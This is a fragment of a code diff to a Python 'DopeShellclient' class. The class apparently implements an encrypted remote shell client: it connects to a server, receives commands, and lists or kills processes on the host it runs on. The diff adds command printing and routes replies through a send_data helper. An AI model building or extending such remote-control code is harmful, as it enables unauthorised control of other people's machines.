@@ -75,7 +75,7 @@ class DopeShellclient:
         self.sock.connect((self.server_ip, self.server_port))
         while True:
             command = self.decrypt(self.sock.recv(4096)).decode('utf-8')
-            
+            print(command)
             if command.lower() == 'exit':
                 break
 
@@ -163,7 +163,7 @@ class DopeShellclient:
                 processes = ""
                 for proc in psutil.process_iter(['pid', 'name', 'username']):
                     processes += f"PID: {proc.info['pid']}, Name: {proc.info['name']}, User: {proc.info['username']}\n"
-                self.send_data(processes.encode('utf-8'))
+                self.send_data(processes)
 
             elif command.lower().startswith('kill'):
                 _, pid = command.split(' ', 1)
@@ -172,7 +172,7 @@ class DopeShellclient:
                     output = f"Process {pid} killed successfully."
                 except Exception as e:
                     output = f"Failed to kill process {pid}: {e}"
-                self.sock.send(self.encrypt(output.encode('utf-8')))
+                self.send_data(output)
 
             elif command.lower().startswith('cat'):
                 try:
